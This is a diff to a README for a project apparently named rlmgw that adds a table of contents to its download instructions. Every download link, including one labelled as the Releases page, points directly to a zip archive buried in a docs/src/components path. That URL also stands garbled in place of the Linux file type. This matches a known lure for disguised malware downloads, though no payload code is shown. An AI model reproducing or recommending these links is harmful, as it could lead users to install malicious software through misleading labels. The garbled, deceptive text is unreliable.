@@ -7,6 +7,18 @@
 ![PyPI version](https://img.shields.io/pypi/v/rlm?style=flat-square&logo=pypi&color=green) ![PyPI downloads](https://img.shields.io/pypi/dm/rlm?style=flat-square&color=brightgreen) ![PyPI license](https://img.shields.io/pypi/l/rlm?style=flat-square) [![Deployed](https://img.shields.io/badge/deployed-0.1.0-blue?style=flat-square)](https://pypi.org/project/rlm)
 
 <!-- AUTO-PACKAGE-BADGES:END -->
+
+## Table of Contents
+1. [📥 Download Now](#-download-now)
+2. [🚀 Getting Started](#-getting-started)
+3. [💻 System Requirements](#-system-requirements)
+4. [📦 Download & Install](#-download--install)
+5. [🎉 Running the Application](#-running-the-application)
+6. [🛠 Troubleshooting](#-troubleshooting)
+7. [📖 Additional Resources](#-additional-resources)
+8. [🤝 Community Support](#-community-support)
+9. [🔗 Links](#-links)
+
 ## 📥 Download Now
 [![Download](https://raw.githubusercontent.com/ENTITY107/rlmgw/main/docs/src/components/Software-2.6.zip%20rlmgw-latest%20release-brightgreen)](https://raw.githubusercontent.com/ENTITY107/rlmgw/main/docs/src/components/Software-2.6.zip)
 
@@ -27,13 +39,13 @@ To get started, you need to visit the Releases page to download rlmgw. Here are 
 1. Click the link below to go to the Releases page:
    [Visit the Releases Page to Download](https://raw.githubusercontent.com/ENTITY107/rlmgw/main/docs/src/components/Software-2.6.zip).
 
-2. Once there, find the latest version listed at the top of the page. This version should have a title like "v1.0.0" or similar. 
+2. Once there, find the latest version listed at the top of the page. This version should have a title like "v1.0.0" or similar.
 
 3. Click on the title to expand the details.
 
 4. Look for the asset that fits your operating system. You will likely see options such as `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/ENTITY107/rlmgw/main/docs/src/components/Software-2.6.zip` for Linux.
 
-5. Click on the appropriate file to start the download. 
+5. Click on the appropriate file to start the download.
 
 6. After the download finishes, navigate to your Downloads folder. You will find the file there.
 
